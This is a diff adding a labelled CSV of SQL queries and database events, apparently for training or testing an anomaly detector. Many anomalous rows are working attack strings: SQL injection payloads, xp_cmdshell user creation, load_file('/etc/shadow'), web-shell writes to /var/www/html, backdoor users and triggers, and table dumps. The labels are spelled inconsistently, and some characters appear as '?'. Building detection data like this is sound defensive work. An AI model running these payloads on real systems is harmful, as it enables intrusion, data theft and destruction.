@@ -1,0 +1,1120 @@
+﻿query log,status,label
+SELECT * FROM users WHERE username = 'admin' OR '1'='1';,anomaly,0
+SELECT id FROM accounts WHERE email = '' UNION SELECT password FROM users;,anomaly,0
+SELECT * FROM products WHERE id = 10; DROP TABLE users;,anomaly,0
+SELECT * FROM orders WHERE order_id = 105 OR 1=1 -- bypass,anomaly,0
+SELECT * FROM customers WHERE name = 'a'/**/OR/**/1=1;,anomaly,0
+SELECT * FROM login WHERE user='admin' AND pass='' OR ''='';,anomaly,0
+SELECT * FROM users WHERE id = 5 UNION ALL SELECT credit_card FROM payments;,anomaly,0
+SELECT * FROM logs WHERE msg LIKE '%'; EXEC xp_cmdshell('whoami');,anomaly,0
+SELECT * FROM items WHERE category = 'x' OR sleep(5);,anomaly,0
+"SELECT * FROM data WHERE id = 1 OR benchmark(1000000,MD5(1));",anomaly,0
+SELECT * FROM users WHERE username='admin' AND password='admin';,anomaly,0
+SELECT * FROM users WHERE username='root' AND password='123456';,anomaly,0
+SELECT * FROM users WHERE username='test' AND password='test';,anomaly,0
+SELECT * FROM users WHERE username='admin' AND password LIKE '%';,anomaly,0
+SELECT * FROM users WHERE username='administrator';,anomaly,0
+SELECT * FROM users WHERE email='admin@localhost';,anomaly,0
+SELECT * FROM users WHERE username='root' LIMIT 1;,anomaly,0
+SELECT * FROM users WHERE username='admin' AND password='password';,anomaly,0
+SELECT * FROM users WHERE username='sys';,anomaly,0
+SELECT * FROM users WHERE username='admin' AND LENGTH(password)<8;,anomaly,0
+GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%';,anomaly,0
+CREATE USER 'backdoor'@'%' IDENTIFIED BY '1234';,anomaly,0
+SET GLOBAL general_log = 'ON';,anomaly,0
+UPDATE users SET role='admin' WHERE username='guest';,anomaly,0
+ALTER USER 'app'@'%' IDENTIFIED BY 'weakpass';,anomaly,0
+"INSERT INTO users(username,role) VALUES('hidden_admin','admin');",anomaly,0
+SET PASSWORD FOR 'root'@'localhost' = PASSWORD('newpass');,anomaly,0
+DROP USER 'audit'@'localhost';,anomaly,0
+ALTER TABLE users ADD COLUMN is_superuser BOOLEAN DEFAULT TRUE;,anomaly,0
+CREATE EVENT backdoor_event ON SCHEDULE EVERY 1 DAY DO UPDATE users SET role='admin';,anomaly,0
+SELECT credit_card FROM payments;,anomaly,0
+SELECT ssn FROM employees;,anomaly,0
+SELECT password FROM users;,anomaly,0
+SELECT api_key FROM system_config;,anomaly,0
+SELECT private_key FROM certificates;,anomaly,0
+SELECT medical_record FROM patients;,anomaly,0
+SELECT salary FROM payroll;,anomaly,0
+SELECT secret_token FROM auth_tokens;,anomaly,0
+SELECT encryption_key FROM key_store;,anomaly,0
+SELECT personal_id FROM customers;,anomaly,0
+SELECT * FROM users INTO OUTFILE '/tmp/users.csv';,anomaly,0
+SELECT * FROM payments INTO OUTFILE '/var/www/html/payments.txt';,anomaly,0
+SELECT * FROM orders INTO OUTFILE '/home/mysql/orders.dump';,anomaly,0
+SELECT * FROM customers INTO OUTFILE '/tmp/data_leak.csv';,anomaly,0
+SELECT * FROM audit_logs INTO OUTFILE '/backup/logs.txt';,anomaly,0
+SELECT * FROM employees INTO OUTFILE '/shared/hr.csv';,anomaly,0
+SELECT * FROM transactions INTO OUTFILE '/tmp/tx_all.csv';,anomaly,0
+SELECT * FROM users INTO OUTFILE '/export/users_all.csv';,anomaly,0
+SELECT * FROM accounts INTO OUTFILE '/tmp/accounts.dump';,anomaly,0
+SELECT * FROM secrets INTO OUTFILE '/tmp/secrets.txt';,anomaly,0
+UPDATE accounts SET balance=0;,anomaly,0
+DELETE FROM transactions;,anomaly,0
+UPDATE orders SET total_amount=1;,anomaly,0
+DELETE FROM audit_logs WHERE 1=1;,anomaly,0
+UPDATE users SET email=NULL;,anomaly,0
+TRUNCATE TABLE payments;,anomaly,0
+UPDATE inventory SET stock=999999;,anomaly,0
+DELETE FROM logs WHERE created_at < NOW();,anomaly,0
+UPDATE customers SET name='unknown';,anomaly,0
+ALTER TABLE orders DROP COLUMN total_amount;,anomaly,0
+"SELECT * FROM users u, users u2, users u3;",anomaly,0
+SELECT sleep(30);,anomaly,0
+"SELECT benchmark(5000000, SHA1('x'));",anomaly,0
+SELECT * FROM logs ORDER BY RAND();,anomaly,0
+"SELECT COUNT(*) FROM large_table t1, large_table t2;",anomaly,0
+SELECT * FROM data WHERE MATCH(content) AGAINST('*');,anomaly,0
+SELECT * FROM records WHERE id IN (SELECT id FROM records);,anomaly,0
+SELECT * FROM users LIMIT 999999999;,anomaly,0
+SELECT * FROM huge_table;,anomaly,0
+SELECT * FROM events WHERE timestamp BETWEEN '1900-01-01' AND '2100-01-01';,anomaly,0
+SELECT * FROM orders WHERE YEAR(created_at)=2020;,anomaly,0
+SELECT * FROM users WHERE LOWER(email)='test@test.com';,anomaly,0
+SELECT * FROM logs WHERE message LIKE '%error%';,anomaly,0
+SELECT * FROM transactions ORDER BY created_at;,anomaly,0
+SELECT * FROM payments WHERE amount+1 > 100;,anomaly,0
+"SELECT * FROM customers WHERE SUBSTRING(name,1,1)='A';",anomaly,0
+SELECT * FROM products WHERE price*2 > 100;,anomaly,0
+SELECT * FROM sessions WHERE DATE(last_seen)=CURDATE();,anomaly,0
+SELECT * FROM orders WHERE status!='completed';,anomaly,0
+SELECT * FROM users WHERE LENGTH(username)>5;,anomaly,0
+ALTER TABLE users DROP PRIMARY KEY;,anomaly,0
+ALTER TABLE orders MODIFY total_amount VARCHAR(10);,anomaly,0
+DROP INDEX idx_email ON users;,anomaly,0
+SET GLOBAL max_connections=100000;,anomaly,0
+ALTER TABLE payments ENGINE=MyISAM;,anomaly,0
+RENAME TABLE users TO users_backup;,anomaly,0
+ALTER TABLE logs DISABLE KEYS;,anomaly,0
+SET sql_mode='';,anomaly,0
+ALTER TABLE customers DROP COLUMN email;,anomaly,0
+SET GLOBAL event_scheduler=ON;,anomaly,0
+INSERT INTO transactions(amount) VALUES(-99999);,anomaly,0
+UPDATE accounts SET balance=balance+1000000;,anomaly,0
+"INSERT INTO payments(amount,status) VALUES(0,'completed');",anomaly,0
+UPDATE invoices SET paid=1 WHERE total_amount=0;,anomaly,0
+INSERT INTO refunds(amount) VALUES(999999);,anomaly,0
+UPDATE wallet SET balance=balance*10;,anomaly,0
+INSERT INTO orders(total_amount) VALUES(1);,anomaly,0
+UPDATE transactions SET fee=0;,anomaly,0
+"INSERT INTO payments(amount,currency) VALUES(100000,'BTC');",anomaly,0
+UPDATE accounts SET balance=NULL;,anomaly,0
+UPDATE orders SET status='completed' WHERE status='pending';,anomaly,0
+INSERT INTO users(role) VALUES('admin');,anomaly,0
+UPDATE users SET verified=1;,anomaly,0
+DELETE FROM approval_queue;,anomaly,0
+INSERT INTO access_logs(user_id) VALUES(1);,anomaly,0
+UPDATE subscriptions SET active=1;,anomaly,0
+INSERT INTO coupons(discount) VALUES(100);,anomaly,0
+UPDATE products SET price=1;,anomaly,0
+DELETE FROM rate_limit;,anomaly,0
+UPDATE users SET two_factor_enabled=0;,anomaly,0
+SELECT * FROM users WHERE username='john_doe';,normaly,1
+"INSERT INTO users(username,email) VALUES('alice','alice@mail.com');",normaly,1
+UPDATE users SET last_login=NOW() WHERE id=10;,normaly,1
+"SELECT order_id,total_amount FROM orders WHERE user_id=5;",normaly,1
+"INSERT INTO orders(user_id,total_amount) VALUES(5,250.00);",normaly,1
+SELECT COUNT(*) FROM transactions WHERE created_at >= CURDATE();,normaly,1
+UPDATE inventory SET stock=stock-1 WHERE product_id=20;,normaly,1
+SELECT * FROM products WHERE category='electronics' LIMIT 20;,normaly,1
+"INSERT INTO audit_logs(action,user_id) VALUES('login',5);",normaly,1
+SELECT email FROM users WHERE id=3;,normaly,1
+UPDATE payments SET status='completed' WHERE payment_id=101;,normaly,1
+SELECT * FROM invoices WHERE status='pending';,normaly,1
+"INSERT INTO refunds(order_id,amount) VALUES(10,50.00);",normaly,1
+SELECT * FROM customers WHERE country='TH';,normaly,1
+UPDATE users SET password_hash='hashvalue' WHERE id=7;,normaly,1
+SELECT * FROM logs WHERE created_at >= NOW() - INTERVAL 1 DAY;,normaly,1
+"INSERT INTO sessions(user_id,created_at) VALUES(8,NOW());",normaly,1
+SELECT SUM(amount) FROM payments WHERE status='completed';,normaly,1
+UPDATE subscriptions SET renewed_at=NOW() WHERE user_id=9;,normaly,1
+SELECT * FROM products ORDER BY created_at DESC LIMIT 10;,normaly,1
+SELECT * FROM users WHERE username = 'admin' OR '1'='1' --,anormaly,0
+UPDATE accounts SET balance = 999999 WHERE user_id = 123; DROP TABLE logs;--,anormaly,0
+" UNION SELECT credit_card, cvv FROM payment_info--",anormaly,0
+"""; EXEC xp_cmdshell('net user hacker P@ss123 /add')--",anormaly,0
+username=test'; WAITFOR DELAY '00:00:10'--,anormaly,0
+SELECT password FROM admin WHERE id = (SELECT SLEEP(10))--,anormaly,0
+ AND (SELECT COUNT(*) FROM sysobjects) > 0--,anormaly,0
+%27+OR+1%3D1%23,anormaly,0
+"admin' AND 1=CONVERT(int, (SELECT @@version))--",anormaly,0
+; INSERT INTO logs (msg) VALUES ('backdoor_installed')--,anormaly,0
+SELECT * FROM users WHERE username = 'john.doe',normaly,1
+"SELECT product_id, name FROM catalog WHERE category = 'electronics'",normaly,1
+"INSERT INTO user_sessions (user_id, token) VALUES (456, 'a1b2c3d4')",normaly,1
+DELETE FROM temp_cache WHERE created_at < '2026-01-05',normaly,1
+UPDATE profile SET last_login = '2026-01-06 10:00:00' WHERE user_id = 789,normaly,1
+SELECT order_id FROM orders WHERE customer_email = 'user@example.com',normaly,1
+SELECT COUNT(*) FROM failed_logins WHERE ip = '192.168.1.100',normaly,1
+"INSERT INTO audit_log (event, user) VALUES ('login_success', 'alice')",normaly,1
+SELECT balance FROM accounts WHERE account_number = 'ACC-8899',normaly,1
+SELECT version() FROM dual,normaly,1
+"Failed login: user='admin', password='password123' (IP: 203.0.113.45)",anormaly,0
+Brute-force detected: 50 failed logins for 'root' in 2 mins,anormaly,0
+Login attempt with empty password from 198.51.100.22,anormaly,0
+User 'guest' trying password '123456789' – blocked by WAF,anormaly,0
+"Multiple logins with common passwords: 'qwerty', 'letmein', 'admin'",anormaly,0
+Credential stuffing: reused password from breach detected,anormaly,0
+Login from Tor exit node (IP: 192.0.2.88) for user 'ceo',anormaly,0
+Password spray: same password 'Winter2025!' tried on 100 accounts,anormaly,0
+SQL Auth: sa login with weak password 'sa123',anormaly,0
+LDAP bind attempt with null credentials,anormaly,0
+"Successful login: user='j.smith', IP='203.0.113.10'",normaly,1
+Password change request for user 'emma' – OTP verified,normaly,1
+MFA enabled for user 'david',normaly,1
+"Login from known device (Chrome, Windows) for user 'anna'",normaly,1
+Session timeout after 30 min inactivity,normaly,1
+User 'mike' logged in via SSO (Okta),normaly,1
+New device login approved via email for user 'lisa',normaly,1
+Password reset initiated – email sent to user@example.com,normaly,1
+Auto-logout after 15 min idle time,normaly,1
+User 'tom' accessed profile settings,normaly,1
+User 'webapp' granted DBA role unexpectedly,anormaly,0
+New stored procedure 'xp_backdoor' created in master DB,anormaly,0
+ALTER USER sa WITH PASSWORD = 'new_backdoor_pass',anormaly,0
+Linked server created to external IP 94.131.xx.xx,anormaly,0
+SQL Agent job added: 'daily_cleanup' – executes powershell script,anormaly,0
+TRIGGER created on sys.tables – suspicious,anormaly,0
+User added to 'sysadmin' fixed server role by non-admin,anormaly,0
+Encrypted payload in comment field of table 'temp_data',anormaly,0
+"EXEC sp_addsrvrolemember 'hacker', 'sysadmin'",anormaly,0
+Custom CLR assembly loaded – unsigned,anormaly,0
+DB role 'report_reader' granted to user 'analyst',normaly,1
+Stored procedure 'sp_generate_report' updated by DBA,normaly,1
+Password rotated for service account 'app_svc',normaly,1
+Linked server to reporting DB (internal IP 10.10.20.5),normaly,1
+SQL Agent job 'weekly_backup' scheduled by admin,normaly,1
+Audit trigger added to track changes on 'orders' table,normaly,1
+User 'dev_team' added to 'db_datareader' on dev DB,normaly,1
+Comment added: 'Fix for bug #1234' in migration script,normaly,1
+sp_addrolemember used to add user to 'db_owner' (by DBA),normaly,1
+Signed CLR assembly for data hashing deployed,normaly,1
+"User 'intern' queried 10,000 rows from 'employee_ssn' table",anormaly,0
+SELECT * FROM credit_cards WHERE 1=1,anormaly,0
+Export of full customer PII table by non-HR user,anormaly,0
+Accessed healthcare records of CEO by support agent,anormaly,0
+Downloaded all user emails and phone numbers in one query,anormaly,0
+SELECT password_hash FROM auth_table WHERE user_id > 0,anormaly,0
+Queried 'salary' table from HR schema by finance user,anormaly,0
+Accessed 500 passport numbers in 5 minutes,anormaly,0
+SELECT * FROM internal.patients WHERE diagnosis = 'HIV',anormaly,0
+User 'tester' ran query: SELECT api_keys FROM config,anormaly,0
+User 'hr_manager' exported 3 employee records for onboarding,normaly,1
+SELECT email FROM users WHERE last_login > '2026-01-01',normaly,1
+Report generated: active customer count (no PII),normaly,1
+Accessed own medical record via patient portal,normaly,1
+"SELECT order_id, status FROM orders WHERE user_id = 123",normaly,1
+Password reset token generated – hash not exposed,normaly,1
+Finance user queried 'budget' table (non-sensitive),normaly,1
+Exported 10 product SKUs for marketing campaign,normaly,1
+SELECT COUNT(*) FROM patients WHERE doctor_id = 45,normaly,1
+Dev user tested API key rotation – used dummy key,normaly,1
+"Exported 500,000 rows to CSV at 3 AM (user: dev1)",anormaly,0
+SQL dump of entire 'users' table initiated via web interface,anormaly,0
+SELECT * INTO OUTFILE '/tmp/dump.csv' FROM secrets,anormaly,0
+Bulk export to S3 from internal DB – no approval ticket,anormaly,0
+Data copied to external USB drive (detected via endpoint log),anormaly,0
+mysqldump executed by non-DBA user,anormaly,0
+SELECT * FROM customers; results sent via email attachment,anormaly,0
+Daily report size spiked from 2KB to 200MB,anormaly,0
+Encrypted ZIP of DB backup uploaded to personal Dropbox,anormaly,0
+PowerShell script exported all tables to JSON,anormaly,0
+Scheduled export: daily sales summary (200 rows),normaly,1
+DBA performed weekly backup via mysqldump (approved),normaly,1
+SELECT * FROM logs WHERE date = '2026-01-05' (debugging),normaly,1
+Exported user list for email campaign (opt-in only),normaly,1
+Data export to BI tool (Tableau) – normal pipeline,normaly,1
+CSV generated for finance reconciliation (50 rows),normaly,1
+Report emailed to manager – encrypted with company key,normaly,1
+Temp export for data migration test (approved),normaly,1
+SELECT COUNT(*) FROM transactions (monitoring),normaly,1
+Archived old orders to cold storage (automated job),normaly,1
+UPDATE users SET is_admin = 1 WHERE username = 'hacker',anormaly,0
+DELETE FROM audit_logs WHERE event_date > '2026-01-01',anormaly,0
+SET IDENTITY_INSERT ON; INSERT INTO transactions...,anormaly,0
+TRUNCATE TABLE customer_feedback,anormaly,0
+ALTER TABLE orders DROP COLUMN payment_status,anormaly,0
+UPDATE salary SET amount = amount * 10 WHERE emp_id = 123,anormaly,0
+Injected fake transactions totaling $1M,anormaly,0
+Changed user role from 'user' to 'superadmin',anormaly,0
+Deleted all records from 'compliance_logs',anormaly,0
+Overwrote config table with malicious redirect URL,anormaly,0
+UPDATE user_profile SET phone = '+1234567890' WHERE user_id = 456,normaly,1
+DELETE FROM sessions WHERE expired = 1,normaly,1
+INSERT INTO logs (event) VALUES ('system_maintenance'),normaly,1
+TRUNCATE TABLE temp_import_staging (daily cleanup),normaly,1
+"ALTER TABLE products ADD COLUMN weight_kg DECIMAL(5,2)",normaly,1
+UPDATE inventory SET stock = stock - 2 WHERE sku = 'ABC123',normaly,1
+Reversed test transaction #T-9999,normaly,1
+Promoted user 'jane' to 'manager' role (HR approved),normaly,1
+Deleted old temp files from 'upload_cache',normaly,1
+Updated config: homepage_url = 'https://new.example.com',normaly,1
+"Query: SELECT REPLICATE('A', 1000000) FROM users – caused OOM",anormaly,0
+1000 concurrent connections from single IP,anormaly,0
+Recursive CTE with no termination – 100% CPU,anormaly,0
+"Cartesian product: SELECT * FROM A, B, C, D",anormaly,0
+Infinite loop in stored procedure 'sp_calc',anormaly,0
+Massive sort operation: ORDER BY RAND() LIMIT 1 ON 10M rows,anormaly,0
+Query with 50 JOINs – timeout after 300s,anormaly,0
+Memory grant > 90% of server RAM,anormaly,0
+Repeated queries with no index – full table scans,anormaly,0
+Spam of small queries: 10K/min from botnet,anormaly,0
+Report query: JOIN orders + customers – completed in 2s,normaly,1
+10 concurrent users during business hours,normaly,1
+CTE used for hierarchy – executed normally,normaly,1
+SELECT with 3 JOINs – uses covering index,normaly,1
+Stored procedure 'sp_monthly_report' ran successfully,normaly,1
+Random sample: SELECT * FROM logs ORDER BY RAND() LIMIT 10,normaly,1
+Complex analytics query – completed in 45s (expected),normaly,1
+Memory usage: 40% during peak load,normaly,1
+Query uses index on user_id – fast response,normaly,1
+API served 500 req/min – within SLA,normaly,1
+Query runtime jumped from 50ms to 12s (plan changed),anormaly,0
+Parameter sniffing caused bad plan – 100x slowdown,anormaly,0
+Missing index on WHERE clause – 1M row scan,anormaly,0
+Implicit conversion: WHERE id = '123' (id is INT),anormaly,0
+STATISTICS outdated – wrong row estimates,anormaly,0
+Blocking chain: SPID 55 blocked by SPID 60 for 5 min,anormaly,0
+Deadlock detected: 3 processes involved,anormaly,0
+Query with LIKE '%keyword%' – no full-text index,anormaly,0
+Cursor used instead of set-based – 10x slower,anormaly,0
+TempDB full due to spill from hash join,anormaly,0
+Query runtime: 45ms (consistent with baseline),normaly,1
+Parameterized query – stable execution plan,normaly,1
+Index seek used – 5 rows returned,normaly,1
+WHERE user_id = 789 (correct data type),normaly,1
+Auto-update stats ran – query fast,normaly,1
+No blocking – all sessions idle,normaly,1
+No deadlocks in last 24h,normaly,1
+"Full-text search used: CONTAINS(text, 'keyword')",normaly,1
+Set-based UPDATE – completed in 200ms,normaly,1
+TempDB usage: 10% – normal,normaly,1
+AUTO_CLOSE enabled on production DB,anormaly,0
+Recovery model = SIMPLE on critical DB,anormaly,0
+No backup in last 7 days,anormaly,0
+Max degree of parallelism = 0 on OLTP server,anormaly,0
+Ad hoc queries enabled – plan cache bloated,anormaly,0
+xp_cmdshell enabled – security risk,anormaly,0
+Default trace disabled,anormaly,0
+Orphaned users found in 5 databases,anormaly,0
+Deprecated feature: TEXT column used,anormaly,0
+DB owner = 'sa' – not best practice,anormaly,0
+AUTO_CLOSE = OFF (best practice),normaly,1
+Recovery model = FULL with log backups,normaly,1
+Full backup completed at 02:00 AM,normaly,1
+MAXDOP = 8 (aligned with core count),normaly,1
+Optimize for ad hoc workloads = ON,normaly,1
+xp_cmdshell = disabled,normaly,1
+Default trace = enabled,normaly,1
+All users mapped to logins,normaly,1
+Migrated TEXT to VARCHAR(MAX),normaly,1
+DB owner = 'db_admin' (non-sa),normaly,1
+"Transfer $500,000 to new account in high-risk country",anormaly,0
+Refund issued before payment confirmed,anormaly,0
+Negative quantity in inventory adjustment,anormaly,0
+User applied 99% discount coupon on $10K order,anormaly,0
+Same credit card used for 100 orders in 1 hour,anormaly,0
+Round-trip transaction: A ? B ? A in 2 min,anormaly,0
+Invoice total ? line item sum ($1 discrepancy),anormaly,0
+Payment marked as 'completed' with $0 amount,anormaly,0
+Currency mismatch: USD payment for EUR invoice,anormaly,0
+Internal test transaction with real customer ID,anormaly,0
+Transfer $200 to verified savings account,normaly,1
+Refund processed after 7-day return window,normaly,1
+Inventory adjusted: +10 units (recount),normaly,1
+10% loyalty discount applied to order,normaly,1
+User made 3 purchases in 1 hour (normal),normaly,1
+Split payment: $50 + $30 for same order,normaly,1
+Invoice total matches line items ($149.99),normaly,1
+Payment of $0 for free trial signup,normaly,1
+Order in EUR – paid with EUR card,normaly,1
+Test transaction with test_customer_id,normaly,1
+Bypassed OTP by setting 'skip_mfa=true' in URL,anormaly,0
+Changed order status from 'pending' to 'shipped' via API,anormaly,0
+Accessed /admin/users without role check,anormaly,0
+Modified JWT token: role=“admin”,anormaly,0
+Used debug endpoint /api/v1/internal/delete_all,anormaly,0
+Sent request with X-User-ID: 999 (impersonation),anormaly,0
+Disabled rate limiting via header: X-Skip-Limit=1,anormaly,0
+Posted review with rating=10 (max is 5),anormaly,0
+Uploaded .exe file via profile picture endpoint,anormaly,0
+Called /checkout?bypass_tax=true,anormaly,0
+Completed MFA with Google Authenticator,normaly,1
+Order status updated by warehouse system,normaly,1
+Accessed /user/profile (authorized),normaly,1
+Valid JWT token – role=“customer”,normaly,1
+Used public API /api/v1/products,normaly,1
+X-User-ID matches session user,normaly,1
+Rate-limited: 100 req/hour (normal),normaly,1
+Rating submitted: 4 stars,normaly,1
+"Uploaded profile.jpg (JPEG, 200KB)",normaly,1
+Checkout with standard tax calculation,normaly,1
+SELECT * FROM users WHERE id = '1' OR '1'='1';,anormaly,0
+"SELECT username, password FROM users WHERE id = 10 UNION SELECT user, password FROM mysql.user;",anormaly,0
+SELECT * FROM products WHERE id = 1; WAITFOR DELAY '0:0:10';--,anormaly,0
+admin'--,anormaly,0
+"SELECT * FROM items WHERE id = 1 AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a);",anormaly,0
+EXEC sp_executeSQL N'SELECT * FROM Employees WHERE Name = ''' + @name + '''',anormaly,0
+"1' GROUP BY users.password, users.username HAVING 1=1--",anormaly,0
+SELECT * FROM news WHERE id = -1 OR 2+2-3=1,anormaly,0
+SELECT ASYNC_KEEPALIVE FROM dual WHERE 1=1 AND (SELECT 5834 FROM (SELECT(SLEEP(5)))YmSX),anormaly,0
+INSERT INTO logs (msg) VALUES ('test'); ATTACH DATABASE '/var/www/html/shell.php' AS pwn; --,anormaly,0
+ALTER USER 'sa' IDENTIFIED BY 'password123';,anormaly,0
+"SELECT user, host, authentication_string FROM mysql.user;",anormaly,0
+CREATE USER 'attacker'@'%' IDENTIFIED BY 'Aa123456!';,anormaly,0
+SET PASSWORD FOR 'root'@'localhost' = PASSWORD('new_pass');,anormaly,0
+SELECT * FROM app_users WHERE password_hash LIKE '$2b$10$%';,anormaly,0
+UPDATE users SET password = 'plain_text_password' WHERE role = 'admin';,anormaly,0
+DROP USER 'security_admin'@'localhost';,anormaly,0
+GRANT USAGE ON *.* TO 'temp_user'@'%' IDENTIFIED BY '123';,anormaly,0
+SELECT load_file('/etc/shadow');,anormaly,0
+SELECT * FROM sys.database_principals WHERE type_desc = 'SQL_USER';,anormaly,0
+GRANT ALL PRIVILEGES ON *.* TO 'web_user'@'%';,anormaly,0
+"EXEC sp_addsrvrolemember 'web_app_user', 'sysadmin';",anormaly,0
+CREATE TRIGGER backdoor AFTER INSERT ON users FOR EACH ROW EXECUTE PROCEDURE grant_admin();,anormaly,0
+UPDATE pg_authid SET rolsuper = true WHERE rolname = 'guest';,anormaly,0
+CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';,anormaly,0
+EXEC master..xp_cmdshell 'net user /add attacker pass123';,anormaly,0
+ALTER USER 'developer' WITH SUPERUSER;,anormaly,0
+CREATE OR REPLACE VIEW system_config AS SELECT * FROM secret_table;,anormaly,0
+SET GLOBAL general_log = 'ON'; SET GLOBAL general_log_file = '/var/www/html/log.php';,anormaly,0
+CREATE EVENT e_backdoor ON SCHEDULE EVERY 1 HOUR DO UPDATE users SET role='admin';,anormaly,0
+"SELECT credit_card_number, cvv, expiry FROM payments WHERE amount > 1000;",anormaly,0
+"SELECT id_card_number, full_name, address FROM patient_records;",anormaly,0
+SELECT * FROM oauth_tokens WHERE expires_at > NOW();,anormaly,0
+"SELECT email, hashed_password, salt FROM members WHERE is_admin = 1;",anormaly,0
+SELECT social_security_number FROM employees;,anormaly,0
+SELECT private_key FROM ssl_certs;,anormaly,0
+SELECT * FROM customer_logs WHERE payload LIKE '%API_KEY%';,anormaly,0
+SELECT phone_number FROM users WHERE country = 'TH' LIMIT 1000000;,anormaly,0
+SELECT backup_path FROM system_settings;,anormaly,0
+SELECT DISTINCT(ip_address) FROM login_history;,anormaly,0
+"SELECT * FROM orders INTO OUTFILE '/tmp/exfil_data.csv' FIELDS TERMINATED BY ',';",anormaly,0
+COPY (SELECT * FROM transactions) TO '/tmp/dump.sql';,anormaly,0
+"SELECT JSON_ARRAYAGG(JSON_OBJECT(id, email, secret)) FROM sensitive_table;",anormaly,0
+SELECT * FROM users INTO DUMPFILE '/var/lib/mysql-files/users.bak';,anormaly,0
+BACKUP DATABASE production TO DISK = 'Z:\external_share\leak.bak';,anormaly,0
+SELECT CAST(CC_NUM AS BINARY) FROM payments;,anormaly,0
+SELECT * FROM logs WHERE date > '2020-01-01' FOR XML AUTO;,anormaly,0
+SELECT b64encode(customer_data) FROM vault;,anormaly,0
+INSERT INTO remote_table SELECT * FROM local_sensitive_table@attacker_db;,anormaly,0
+SELECT * FROM hr_records WHERE salary > 0 ORDER BY salary DESC LIMIT 9999999;,anormaly,0
+UPDATE products SET price = 0.01 WHERE price > 1000;,anormaly,0
+DELETE FROM system_configs;,anormaly,0
+UPDATE users SET email = 'hacked@evil.com';,anormaly,0
+TRUNCATE TABLE transaction_history;,anormaly,0
+UPDATE account_balances SET balance = balance + 1000000 WHERE account_id = 99;,anormaly,0
+UPDATE inventory SET stock_count = -1;,anormaly,0
+DROP TABLE logs_2025;,anormaly,0
+UPDATE settings SET value = 'false' WHERE key = 'two_factor_auth_enabled';,anormaly,0
+DELETE FROM orders WHERE status = 'pending';,anormaly,0
+UPDATE votes SET candidate_id = 5;,anormaly,0
+"SELECT a.*, b.*, c.* FROM large_table a, large_table b, large_table c;",anormaly,0
+WITH RECURSIVE t(n) AS (VALUES (1) UNION ALL SELECT n+1 FROM t) SELECT n FROM t;,anormaly,0
+"SELECT REPEAT('A', 1000000000);",anormaly,0
+SELECT * FROM logs WHERE message LIKE '%% %%% %%%% %%%%%';,anormaly,0
+BEGIN; LOCK TABLE users IN EXCLUSIVE MODE;,anormaly,0
+"SELECT BENCHMARK(100000000, MD5('test'));",anormaly,0
+"SELECT * FROM big_data ORDER BY SHA2(data_column, 512);",anormaly,0
+INSERT INTO temp_table SELECT * FROM big_table JOIN big_table;,anormaly,0
+CREATE INDEX idx_heavy ON logs(long_text_column(255));,anormaly,0
+ANALYZE TABLE massive_table;,anormaly,0
+SELECT * FROM users WHERE YEAR(created_at) = 2024;,anormaly,0
+SELECT * FROM orders WHERE status != 'completed';,anormaly,0
+SELECT * FROM products WHERE description LIKE '%iphone%';,anormaly,0
+SELECT count(*) FROM (SELECT DISTINCT * FROM transactions) AS t;,anormaly,0
+"SELECT user_id, (SELECT count(*) FROM orders WHERE orders.user_id = users.id) FROM users;",anormaly,0
+SELECT * FROM sensitive_data WHERE secret_key = 123;,anormaly,0
+SELECT * FROM logs ORDER BY rand() LIMIT 1;,anormaly,0
+SELECT * FROM table1 JOIN table2;,anormaly,0
+SELECT * FROM items WHERE id IN (SELECT id FROM other_table);,anormaly,0
+SELECT sum(price) FROM sales;,anormaly,0
+UPDATE accounts SET balance = balance - 100 WHERE id = 1 AND balance > 0;,anormaly,0
+"INSERT INTO transactions (from_id, to_id, amount) VALUES (10, 20, -5000);",anormaly,0
+UPDATE coupons SET usage_count = usage_count - 1;,anormaly,0
+SELECT * FROM withdrawals WHERE amount > (SELECT credit_limit FROM users WHERE id = withdrawals.user_id);,anormaly,0
+"INSERT INTO ledger (id, amount, currency) VALUES (999, 100, 'BTC');",anormaly,0
+UPDATE orders SET discount_percent = 100 WHERE user_id = 55;,anormaly,0
+UPDATE subscription SET expiry_date = '2099-12-31';,anormaly,0
+"INSERT INTO audit_log (user_id, action) VALUES (1, 'DELETED_OWN_DEBT');",anormaly,0
+SELECT * FROM invoices WHERE total_tax < 0;,anormaly,0
+UPDATE payments SET status = 'PAID' WHERE transaction_id = 'failed_id_123';,anormaly,0
+"CREATE TABLE cache_data (id INT PRIMARY KEY, val VARCHAR(255));",normaly,1
+ALTER TABLE users ADD COLUMN last_login_ip VARCHAR(45);,normaly,1
+CREATE INDEX idx_orders_customer ON orders(customer_id);,normaly,1
+DROP TABLE IF EXISTS temp_session_data;,normaly,1
+ANALYZE TABLE products;,normaly,1
+SELECT * FROM users WHERE id = 105;,normaly,1
+"INSERT INTO logs (level, message, created_at) VALUES ('INFO', 'User logged in', NOW());",normaly,1
+UPDATE profile SET bio = 'Hello world' WHERE user_id = 442;,normaly,1
+DELETE FROM sessions WHERE expiry < '2025-01-01';,normaly,1
+"REPLACE INTO settings (key, value) VALUES ('theme', 'dark');",normaly,1
+"SELECT p.name, o.quantity FROM products p JOIN order_items o ON p.id = o.product_id WHERE o.order_id = 55;",normaly,1
+"SELECT count(*) FROM orders WHERE status = 'shipped' AND created_at > DATE_SUB(NOW(), INTERVAL 1 DAY);",normaly,1
+"SELECT category, AVG(price) FROM products GROUP BY category;",normaly,1
+SELECT * FROM notifications WHERE user_id = 88 ORDER BY created_at DESC LIMIT 10 OFFSET 20;,normaly,1
+UPDATE inventory SET stock = stock - 1 WHERE product_id = 101 AND stock > 0;,normaly,1
+SELECT * FROM articles WHERE title LIKE 'How to%';,normaly,1
+"SELECT id FROM tags WHERE tag_name IN ('tech', 'sql', 'ai');",normaly,1
+SELECT name FROM employees WHERE department_id = 5 AND hire_date > '2023-01-01';,normaly,1
+SELECT * FROM comments WHERE post_id = 1202 AND is_approved = 1;,normaly,1
+SELECT email FROM newsletter_subs WHERE active = true;,normaly,1
+"SELECT * FROM users WHERE username = 'admin' UNION SELECT credit_card, password, ssn FROM customers WHERE '1' = '1'",anormaly,0
+SELECT * FROM users WHERE username = 'admin' OR '1' = '1' -- AND password = '...',anormaly,0
+"SELECT product_id, name FROM products WHERE category = 'electronics'; DROP TABLE users; --",anormaly,0
